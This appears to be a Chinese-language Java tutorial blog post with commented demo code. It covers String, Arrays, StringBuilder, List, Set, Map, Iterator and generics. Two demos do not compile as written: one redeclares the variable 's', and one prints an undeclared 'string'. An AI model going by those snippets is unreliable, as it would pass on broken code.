<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">String_Demo02</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建字符串对象</span></span><br><span class="line">String s = <span class="string">"helloworld"</span>;</span><br><span class="line"><span class="comment">// int length():获取字符串的长度，其实也就是字符个数</span></span><br><span class="line">System.out.println(s.length());</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// String concat (String str):将将指定的字符串连接到该字符串的末尾.</span></span><br><span class="line">String s = <span class="string">"helloworld"</span>;</span><br><span class="line">String s2 = s.concat(<span class="string">"**hello again"</span>);</span><br><span class="line">System.out.println(s2);<span class="comment">// helloworld**hello again</span></span><br><span class="line"><span class="comment">// char charAt(int index):获取指定索引处的字符</span></span><br><span class="line">System.out.println(s.charAt(<span class="number">0</span>));</span><br><span class="line">System.out.println(s.charAt(<span class="number">1</span>));</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// int indexOf(String str):获取str在字符串对象中第一次出现的索引,没有返回‐1</span></span><br><span class="line">System.out.println(s.indexOf(<span class="string">"l"</span>));</span><br><span class="line">System.out.println(s.indexOf(<span class="string">"owo"</span>));</span><br><span class="line">System.out.println(s.indexOf(<span class="string">"ak"</span>));</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// String substring(int start):从start开始截取字符串到字符串结尾</span></span><br><span class="line">System.out.println(s.substring(<span class="number">0</span>));</span><br><span class="line">System.out.println(s.substring(<span class="number">5</span>));</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// String substring(int start,int end):从start到end截取字符串。含start，不含end,左闭右开</span></span><br><span class="line">System.out.println(s.substring(<span class="number">0</span>, s.length()));</span><br><span class="line">System.out.println(s.substring(<span class="number">3</span>,<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="转换功能的方法"><a href="#转换功能的方法" class="headerlink" title="转换功能的方法"></a>转换功能的方法</h2><ul>
<li><p><code>public char[] toCharArray ()</code>：将此字符串转换为新的字符数组。 </p>
</li>
<li><p><code>public byte[] getBytes ()</code>：使用平台的默认字符集将该 String编码转换为新的字节数组。 </p>
</li>
<li><p><code>public String replace (CharSequence target, CharSequence replacement)</code>：将与target匹配的字符串使用replacement字符串替换。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">String_Demo03</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建字符串对象</span></span><br><span class="line">String s = <span class="string">"abcde"</span>;</span><br><span class="line"><span class="comment">// char[] toCharArray():把字符串转换为字符数组</span></span><br><span class="line"><span class="keyword">char</span>[] chs = s.toCharArray();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; chs.length; x++) &#123;</span><br><span class="line">System.out.println(chs[x]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// byte[] getBytes ():把字符串转换为字节数组</span></span><br><span class="line"><span class="keyword">byte</span>[] bytes = s.getBytes();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; bytes.length; x++) &#123;</span><br><span class="line">System.out.println(bytes[x]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// 替换字母it为大写IT</span></span><br><span class="line">String str = <span class="string">"itcast itheima"</span>;</span><br><span class="line">String replace = str.replace(<span class="string">"it"</span>, <span class="string">"IT"</span>);</span><br><span class="line">System.out.println(replace); <span class="comment">// ITcast ITheima</span></span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Arrays-类"><a href="#Arrays-类" class="headerlink" title="Arrays 类"></a>Arrays 类</h1><blockquote>
<p>java.util.Arrays 此类包含用来操作数组的各种方法，比如排序和搜索等。其所有方法均为静态方法，调用起来 非常简单。</p>
</blockquote>
<h2 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h2><ul>
<li><code>public static String toString(int[] a)</code>：返回指定数组内容的字符串表示形式。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 定义int 数组</span></span><br><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">2</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">4</span>,<span class="number">657</span>,<span class="number">8</span>,<span class="number">69</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">// 打印数组,输出地址值</span></span><br><span class="line">System.out.println(arr); <span class="comment">// [I@2ac1fdc4</span></span><br><span class="line"><span class="comment">// 数组内容转为字符串</span></span><br><span class="line">String s = Arrays.toString(arr);</span><br><span class="line"><span class="comment">// 打印字符串,输出内容</span></span><br><span class="line">System.out.println(s); <span class="comment">// [2, 34, 35, 4, 657, 8, 69, 9]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>public static void sort(int[] a)</code>：对指定的 int 型数组按数字<strong>升序</strong>进行排序。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 定义int 数组</span></span><br><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">24</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">48</span>, <span class="number">4</span>, <span class="number">46</span>, <span class="number">35</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">2</span>&#125;;</span><br><span class="line">System.out.println(<span class="string">"排序前:"</span>+ Arrays.toString(arr)); <span class="comment">// 排序前:[24, 7, 5, 48, 4, 46, 35, 11, 6,</span></span><br><span class="line"><span class="number">2</span>]</span><br><span class="line"><span class="comment">// 升序排序</span></span><br><span class="line">Arrays.sort(arr);</span><br><span class="line">System.out.println(<span class="string">"排序后:"</span>+ Arrays.toString(arr));<span class="comment">// 排序后:[2, 4, 5, 6, 7, 11, 24, 35, 46,</span></span><br><span class="line"><span class="number">48</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="StringBuilder-类"><a href="#StringBuilder-类" class="headerlink" title="StringBuilder 类"></a>StringBuilder 类</h1><p>StringBuilder是个字符串的缓冲区，即它是一个容器，容器中可以装很多字符串。并且能够对其中的字符串进行各种操作。</p>
<p>它的内部拥有一个数组用来存放字符串内容，进行字符串拼接时，直接在数组中加入新内容。StringBuilder会自动维护数组的扩容，默认16字符空间，超过自动扩充。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  StringBuilder sb1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">  System.out.println(sb1); <span class="comment">// (空白)</span></span><br><span class="line">  <span class="comment">// 使用带参构造</span></span><br><span class="line">  StringBuilder sb2 = <span class="keyword">new</span> StringBuilder(<span class="string">"itcast"</span>);</span><br><span class="line">  System.out.println(sb2); <span class="comment">// itcast</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><p>StringBuilder常用的方法有2个：</p>
<ul>
<li><code>public StringBuilder append(...)</code>：添加任意类型数据的字符串形式，并返回当前对象自身。</li>
<li><code>public String toString()</code>：将当前StringBuilder对象转换为String对象。</li>
</ul>
<h3 id="append方法"><a href="#append方法" class="headerlink" title="append方法"></a>append方法</h3><p>append方法具有多种重载形式，可以接收任意类型的参数。任何数据作为参数都会将对应的字符串内容添加到StringBuilder中。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02StringBuilder</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//创建对象</span></span><br><span class="line">		StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="comment">//public StringBuilder append(任意类型)</span></span><br><span class="line">		StringBuilder builder2 = builder.append(<span class="string">"hello"</span>);</span><br><span class="line">		<span class="comment">//对比一下</span></span><br><span class="line">		System.out.println(<span class="string">"builder:"</span>+builder);</span><br><span class="line">		System.out.println(<span class="string">"builder2:"</span>+builder2);</span><br><span class="line">		System.out.println(builder == builder2); <span class="comment">//true</span></span><br><span class="line">	    <span class="comment">// 可以添加 任何类型</span></span><br><span class="line">		builder.append(<span class="string">"hello"</span>);</span><br><span class="line">		builder.append(<span class="string">"world"</span>);</span><br><span class="line">		builder.append(<span class="keyword">true</span>);</span><br><span class="line">		builder.append(<span class="number">100</span>);</span><br><span class="line">		<span class="comment">// 在我们开发中，会遇到调用一个方法后，返回一个对象的情况。然后使用返回的对象继续调用方法。</span></span><br><span class="line">    <span class="comment">//链式编程</span></span><br><span class="line">builder.append(<span class="string">"hello"</span>).append(<span class="string">"world"</span>).append(<span class="keyword">true</span>).append(<span class="number">100</span>);</span><br><span class="line">		System.out.println(<span class="string">"builder:"</span>+builder);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a>toString方法</h3><p>通过toString方法，StringBuilder对象将会转换为不可变的String对象。如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo16StringBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 链式创建</span></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="string">"Hello"</span>).append(<span class="string">"World"</span>).append(<span class="string">"Java"</span>);</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        String str = sb.toString();</span><br><span class="line">        System.out.println(str); <span class="comment">// HelloWorldJava</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p>集合按照其存储结构可以分为两大类，分别是：</p>
<p>单列集合<code>java.util.Collection</code></p>
<p>双列集合<code>java.util.Map</code></p>
<h2 id="Collection集合"><a href="#Collection集合" class="headerlink" title="Collection集合"></a>Collection集合</h2><p>单列集合类的根接口，用于存储一系列符合某种规则的元素，它有两个重要的子接口，分别是：</p>
<ul>
<li><p><code>java.util.List</code></p>
</li>
<li><p><code>java.util.Set</code></p>
</li>
</ul>
<p>其中，<code>List</code>的特点是元素有序、元素可重复。</p>
<p><code>Set</code>的特点是元素无序，而且不可重复。</p>
<p><code>List</code>接口的主要实现类有<code>java.util.ArrayList</code>和<code>java.util.LinkedList</code>；</p>
<p><code>Set</code>接口的主要实现类有<code>java.util.HashSet</code>和<code>java.util.TreeSet</code>。</p>
<h3 id="Collection常用功能"><a href="#Collection常用功能" class="headerlink" title="Collection常用功能"></a>Collection常用功能</h3><p>Collection是所有单列集合的父接口，因此在Collection中定义了单列集合(List和Set)通用的一些方法，这些方法可用于操作所有的单列集合。方法如下：</p>
<ul>
<li><code>public boolean add(E e)</code>：  把给定的对象添加到当前集合中 </li>
<li><code>public void clear()</code> :清空集合中所有的元素</li>
<li><code>public boolean remove(E e)</code>: 把给定的对象在当前集合中删除</li>
<li><code>public boolean contains(E e)</code>: 判断当前集合中是否包含给定的对象</li>
<li><code>public boolean isEmpty()</code>: 判断当前集合是否为空</li>
<li><code>public int size()</code>: 返回集合中元素的个数</li>
<li><code>public Object[] toArray()</code>: 把集合中的元素，存储到数组中</li>
</ul>
<h3 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h3><p>java.util.List 接口继承自 Collection 接口，是单列集合的一个重要分支，习惯性地会将实现了 List 接口的对象称为List集合。</p>
<p>在List集合中允许出现重复的元素，所有的元素是以一种线性方式进行存储的，在程序中可以通过【索引】来访问集合中的指定元素。</p>
<p>另外，List集合还有一个特点就是元素有序，即元素的存入顺序和取出顺序一致。</p>
<h4 id="List常用方法"><a href="#List常用方法" class="headerlink" title="List常用方法"></a>List常用方法</h4><p>List作为Collection集合的子接口，不但继承了Collection接口中的全部方法，而且还增加了一些根据元素索引来操作集合的特有方法，如下：</p>
<p><code>public void add(int index, E element)</code> : 将指定的元素，添加到该集合中的指定位置上。</p>
<p><code>public E get(int index)</code>:返回集合中指定位置的元素。</p>
<p><code>public E remove(int index)</code>: 移除列表中指定位置的元素, 返回的是被移除的元素。 </p>
<p><code>public E set(int index, E element)</code>:用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 </p>
<p>List集合特有的方法都是跟索引相关：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建List集合对象</span></span><br><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"><span class="comment">// 往 尾部添加 指定元素</span></span><br><span class="line">list.add(<span class="string">"图图"</span>);</span><br><span class="line">list.add(<span class="string">"小美"</span>);</span><br><span class="line">list.add(<span class="string">"不高兴"</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// add(int index,String s) 往指定位置添加</span></span><br><span class="line">list.add(<span class="number">1</span>,<span class="string">"没头脑"</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// String remove(int index) 删除指定位置元素 返回被删除元素</span></span><br><span class="line"><span class="comment">// 删除索引位置为2的元素</span></span><br><span class="line">System.out.println(<span class="string">"删除索引位置为2的元素"</span>);</span><br><span class="line">System.out.println(list.remove(<span class="number">2</span>));</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// String set(int index,String s)</span></span><br><span class="line"><span class="comment">// 在指定位置 进行 元素替代（改）</span></span><br><span class="line"><span class="comment">// 修改指定位置元素</span></span><br><span class="line">list.set(<span class="number">0</span>, <span class="string">"三毛"</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// String get(int index) 获取指定位置元素</span></span><br><span class="line"><span class="comment">// 跟size() 方法一起用 来 遍历的</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">System.out.println(list.get(i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还可以使用增强for</span></span><br><span class="line"><span class="keyword">for</span>(String str : list)&#123;</span><br><span class="line">  System.out.println(string);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Set接口"><a href="#Set接口" class="headerlink" title="Set接口"></a>Set接口</h3><p>java.util.Set 接口和 java.util.List 接口一样，同样继承自 Collection 接口，它与 Collection 接口中的方法基本一致，并没有对 Collection 接口进行功能上的扩充，只是比 Collection 接口更加严格了。</p>
<p>与 List 接口不 同的是， Set 接口中元素【无序】，并且都会以某种规则保证存入的元素不出现重复。</p>
<h2 id="Map集合"><a href="#Map集合" class="headerlink" title="Map集合"></a>Map集合</h2><p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429182137690.png" alt="image-20200429182137690"></p>
<p>Collection 中的集合，元素是孤立存在的（理解为单身），向集合中存储元素采用一个个元素的方式存储。</p>
<p>Map 中的集合，元素是成对存在的(理解为夫妻)。</p>
<p>每个元素由键与值两部分组成，通过键可以找对所对应的值。</p>
<p> Collection 中的集合称为单列集合， Map 中的集合称为双列集合。</p>
<p>需要注意的是， Map 中的集合不能包含重复的键，值可以重复；每个键只能对应一个值。</p>
<h3 id="Map常用子类"><a href="#Map常用子类" class="headerlink" title="Map常用子类"></a>Map常用子类</h3><p>通过查看Map接口描述，看到Map有多个子类，这里我们主要讲解常用的HashMap集合、LinkedHashMap集合。 </p>
<ul>
<li>HashMap：存储数据采用的哈希表结构，元素的存取顺序不能保证一致。由于要保证键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。</li>
<li>LinkedHashMap：HashMap下有个子类LinkedHashMap，存储数据采用的哈希表结构+链表结构。通过链表结构可以保证元素的存取顺序一致；通过哈希表结构可以保证的键的唯一、不重复，需要重写键的 hashCode()方法、equals()方法。 </li>
</ul>
<blockquote>
<p>tips：Map接口中的集合都有两个泛型变量,在使用时，要为两个泛型变量赋予数据类型。两个泛型变量的数据类型可以相同，也可以不同。</p>
</blockquote>
<h3 id="Map接口常用方法"><a href="#Map接口常用方法" class="headerlink" title="Map接口常用方法"></a>Map接口常用方法</h3><p>Map接口中定义了很多方法，常用的如下： </p>
<p><code>public V put(K key, V value)</code>: 把指定的键与指定的值添加到Map集合中。 </p>
<p><code>public V remove(Object key)</code>: 把指定的键所对应的键值对元素在Map集合中删除，返回被删除元素的值。</p>
<p><code>public V get(Object key)</code>: 根据指定的键，在Map集合中获取对应的value。 </p>
<p><code>public Set&lt;k&gt; keySet()</code>: 获取Map集合中所有的键，存储到Set集合中。</p>
<p><code>public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code> : 获取到Map集合中所有的键值对对象的集合(Set集合)。</p>
<p>演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建 map对象</span></span><br><span class="line">HashMap&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"><span class="comment">//添加元素到集合</span></span><br><span class="line">map.put(<span class="string">"黄晓明"</span>, <span class="string">"杨颖"</span>);</span><br><span class="line">map.put(<span class="string">"文章"</span>, <span class="string">"马伊琍"</span>);</span><br><span class="line">map.put(<span class="string">"邓超"</span>, <span class="string">"孙俪"</span>);</span><br><span class="line">System.out.println(map);</span><br><span class="line"><span class="comment">//String remove(String key)</span></span><br><span class="line">System.out.println(map.remove(<span class="string">"邓超"</span>));</span><br><span class="line">System.out.println(map);</span><br><span class="line"><span class="comment">// 想要查看 黄晓明的媳妇 是谁</span></span><br><span class="line">System.out.println(map.get(<span class="string">"黄晓明"</span>));</span><br><span class="line">System.out.println(map.get(<span class="string">"邓超"</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>tips: 使用put方法时，若指定的键(key)在集合中没有，则没有这个键对应的值，返回null，并把指定的键值添加到集合中； 若指定的键(key)在集合中存在，则返回值为集合中键对应的值（该值为替换前的值），并把指定键所对应的值，替换成指定的新值。</p>
</blockquote>
<h3 id="Entry-键值对对象"><a href="#Entry-键值对对象" class="headerlink" title="Entry 键值对对象"></a>Entry 键值对对象</h3><p>我们已经知道， Map 中存放的是两种对象，一种称为key(键)，一种称为value(值)，它们在在 Map 中是一一对应关系，这一对对象又称做 Map 中的一个 Entry(项) 。</p>
<p>Entry 将键值对的对应关系封装成了对象。即键值对对象，这样我们在遍历 Map 集合时，就可以从每一个键值对（ Entry ）对象中获取对应的键与对应的值。 </p>
<p>既然Entry表示了一对键和值，那么也同样提供了获取对应键和对应值得方法： </p>
<p><code>public K getKey()</code>：获取Entry对象中的键。 </p>
<p><code>public V getValue()</code>：获取Entry对象中的值。 </p>
<p>在Map集合中也提供了获取所有Entry对象的方法： </p>
<p><code>public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code> : 获取到Map集合中所有的键值对对象的集合(Set集合)。</p>
<h3 id="Map集合遍历键值对的方式"><a href="#Map集合遍历键值对的方式" class="headerlink" title="Map集合遍历键值对的方式"></a>Map集合遍历键值对的方式</h3><p>键值对方式：即通过集合中每个键值对(Entry)对象，获取键值对(Entry)对象中的键与值。 </p>
<p>操作步骤与图解： </p>
<ol>
<li>获取Map集合中，所有的键值对(Entry)对象，以Set集合形式返回。entrySet() 。 </li>
<li>遍历包含键值对(Entry)对象的Set集合，得到每一个键值对(Entry)对象。</li>
<li>通过键值对(Entry)对象，获取Entry对象中的键与值。getKey()/getValue()</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapDemo02</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建Map集合对象</span></span><br><span class="line">HashMap&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line"><span class="comment">// 添加元素到集合</span></span><br><span class="line">map.put(<span class="string">"胡歌"</span>, <span class="string">"霍建华"</span>);</span><br><span class="line">map.put(<span class="string">"郭德纲"</span>, <span class="string">"于谦"</span>);</span><br><span class="line">map.put(<span class="string">"薛之谦"</span>, <span class="string">"大张伟"</span>);</span><br><span class="line"><span class="comment">// 获取 所有的 entry对象 entrySet</span></span><br><span class="line">Set&lt;Entry&lt;String,String&gt;&gt; entrySet = map.entrySet();</span><br><span class="line"><span class="comment">// 遍历得到每一个entry对象</span></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry : entrySet) &#123;</span><br><span class="line"><span class="comment">// 解析</span></span><br><span class="line">String key = entry.getKey();</span><br><span class="line">String value = entry.getValue();</span><br><span class="line">System.out.println(key+<span class="string">"的CP是:"</span>+value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>图解：</p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429190122568.png" alt="image-20200429190122568"></p>
<h1 id="Iterator迭代器"><a href="#Iterator迭代器" class="headerlink" title="Iterator迭代器"></a>Iterator迭代器</h1><p>在程序开发中，经常需要遍历集合中的所有元素。针对这种需求，JDK专门提供了一个接口<code>java.util.Iterator</code>。<code>Iterator</code>接口也是Java集合中的一员，但它与<code>Collection</code>、<code>Map</code>接口有所不同，<code>Collection</code>接口与<code>Map</code>接口主要用于存储元素，而<code>Iterator</code>主要用于迭代访问（即遍历）<code>Collection</code>中的元素，因此<code>Iterator</code>对象也被称为迭代器。</p>
<p>想要遍历Collection集合，那么就要获取该集合迭代器完成迭代操作，下面介绍一下获取迭代器的方法：</p>
<ul>
<li><code>public Iterator iterator()</code>: 获取集合对应的迭代器，用来遍历集合中的元素的。</li>
</ul>
<p>下面介绍一下迭代的概念：</p>
<ul>
<li><strong>迭代</strong>：即Collection集合元素的通用获取方式。在取元素之前先要判断集合中有没有元素，如果有，就把这个元素取出来，继续在判断，如果还有就再取出出来。一直把集合中的所有元素全部取出。这种取出方式专业术语称为迭代。</li>
</ul>
<p>Iterator接口的常用方法如下：</p>
<ul>
<li><code>public E next()</code>:返回迭代的下一个元素。</li>
<li><code>public boolean hasNext()</code>:如果仍有元素可以迭代，则返回 true。</li>
</ul>
<p>接下来通过案例学习如何使用Iterator迭代集合中元素：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IteratorDemo</span> </span>&#123;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使用多态方式 创建对象</span></span><br><span class="line">        Collection&lt;String&gt; coll = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加元素到集合</span></span><br><span class="line">        coll.add(<span class="string">"串串星人"</span>);</span><br><span class="line">        coll.add(<span class="string">"吐槽星人"</span>);</span><br><span class="line">        coll.add(<span class="string">"汪星人"</span>);</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="comment">//使用迭代器 遍历   每个集合对象都有自己的迭代器</span></span><br><span class="line">        Iterator&lt;String&gt; it = coll.iterator();</span><br><span class="line">        <span class="comment">//  泛型指的是 迭代出 元素的数据类型</span></span><br><span class="line">        <span class="keyword">while</span>(it.hasNext())&#123; <span class="comment">//判断是否有迭代元素</span></span><br><span class="line">            String s = it.next();<span class="comment">//获取迭代出的元素</span></span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现原理：</p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200428180357303.png" alt="image-20200428180357303"></p>
<p>在调用Iterator的next方法之前，迭代器的索引位于第一个元素之前，不指向任何元素，当第一次调用迭代器的next方法后，迭代器的索引会向后移动一位，指向第一个元素并将该元素返回，当再次调用next方法时，迭代器的索引会指向第二个元素并将该元素返回，依此类推，直到hasNext方法返回false，表示到达了集合的末尾，终止对元素的遍历。</p>
<h2 id="增强for"><a href="#增强for" class="headerlink" title="增强for"></a>增强for</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NBFor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;        </span><br><span class="line">    	Collection&lt;String&gt; coll = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    	coll.add(<span class="string">"小河神"</span>);</span><br><span class="line">    	coll.add(<span class="string">"老河神"</span>);</span><br><span class="line">    	coll.add(<span class="string">"神婆"</span>);</span><br><span class="line">    	<span class="comment">//使用增强for遍历</span></span><br><span class="line">    	<span class="keyword">for</span>(String s :coll)&#123;<span class="comment">//接收变量s代表 代表被遍历到的集合元素</span></span><br><span class="line">    		System.out.println(s);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Collection虽然可以存储各种对象，但实际上通常Collection只存储同一类型对象。例如都是存储字符串对象。因此在JDK5之后，新增了<strong>泛型</strong>(<strong>Generic</strong>)语法，让人们在设计API时可以指定类或方法支持泛型，这样我们使用API的时候也变得更为简洁，并得到了编译时期的语法检查。</p>
<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p>例如，API中的ArrayList集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt;</span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123; &#125;</span><br><span class="line">   	....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用泛型： 即什么时候确定泛型。</p>
<p><strong>在创建对象的时候确定泛型</strong></p>
<p> 例如，<code>ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();</code></p>
<p>此时，变量E的值就是String类型,那么我们的类型就可以理解为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">String</span>&gt;</span>&#123; </span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(String e)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> String <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;  &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

